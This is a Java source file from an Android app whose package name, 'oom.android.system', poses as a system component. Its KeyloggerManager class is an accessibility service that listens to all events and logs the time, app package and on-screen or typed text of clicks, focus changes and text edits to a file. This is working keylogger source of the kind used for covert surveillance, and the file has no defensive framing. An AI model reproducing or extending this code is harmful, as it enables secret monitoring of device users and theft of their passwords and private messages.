package oom.android.system.Managers.Listeners;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.inputmethodservice.InputMethodService;
import android.inputmethodservice.Keyboard;
import android.os.Build;
import android.renderscript.ScriptGroup;
import android.text.method.KeyListener;
import android.text.method.TextKeyListener;
import android.util.Log;
import android.view.InputEvent;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityEventSource;
import android.view.accessibility.AccessibilityManager;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.inputmethod.InputConnection;
import android.view.inputmethod.InputMethod;

import androidx.annotation.RequiresApi;

import org.json.JSONObject;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import oom.android.system.Managers.base;
import oom.android.system.R;
import oom.android.system.Settings.TypeOpenFile;
import oom.android.system.app.MyService;

import static android.accessibilityservice.AccessibilityService.*;
import static oom.android.system.app.MyService.OpenFile;

@RequiresApi(api = Build.VERSION_CODES.N)
public class KeyloggerManager extends AccessibilityService {

    static final String TAG = "RecorderService";

    private String getEventType(AccessibilityEvent event) {
        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                return "VIEW_CLICKED";
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                return "VIEW_FOCUSED";
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                return "WINDOW_STATE_CHANGED";
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                return "TEXT_CHANGED";
            case AccessibilityEvent.TYPE_VIEW_LONG_CLICKED:
                return "VIEW_LONG_CLICKED";
            case AccessibilityEvent.TYPE_VIEW_SELECTED:
                return "VIEW_SELECTED";

        }
        return "default";
    }

    private String getEventText(AccessibilityEvent event) {
        StringBuilder sb = new StringBuilder();
        for (CharSequence s : event.getText()) {
            sb.append(s+" ");
        }
        return sb.toString();
    }
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if(getEventType(event) == "default")
            return;

        SimpleDateFormat dateFormat = new SimpleDateFormat("hh:mm:ss",
                Locale.getDefault());
        JSONObject data = new JSONObject();
        try {
            data.put(base.LOGGER.TIME, dateFormat.format(new Date()));
            data.put(base.LOGGER.TYPE, getEventType(event));
            data.put(base.LOGGER.PACKAGE, event.getPackageName());
            data.put(base.LOGGER.TEXT, getEventText(event));
            MyService.writeFile(TypeOpenFile.Logger,data.toString());

        }catch (Exception e){

        }

    }

    @Override
    public void onInterrupt() {
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.flags = AccessibilityServiceInfo.DEFAULT |
                AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS |
                AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;

        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
        setServiceInfo(info);

    }

    private void debugClick(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            AccessibilityNodeInfo nodeInfo = event.getSource();
            if (nodeInfo == null) {
                return;
            }
            nodeInfo.refresh();
            Log.d(TAG, "ClassName:" + nodeInfo.getClassName() +
                    " Text:" + nodeInfo.getText() +
                    " ViewIdResourceName:" + nodeInfo.getViewIdResourceName() +
                    " isClickable:" + nodeInfo.isClickable());
        }
    }

    private void startApp() {

        Intent i = new Intent();
        i.setComponent(new ComponentName("oom.android.system", "oom.android.system.app.MyService"));
        i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        startService(i);
    }


}
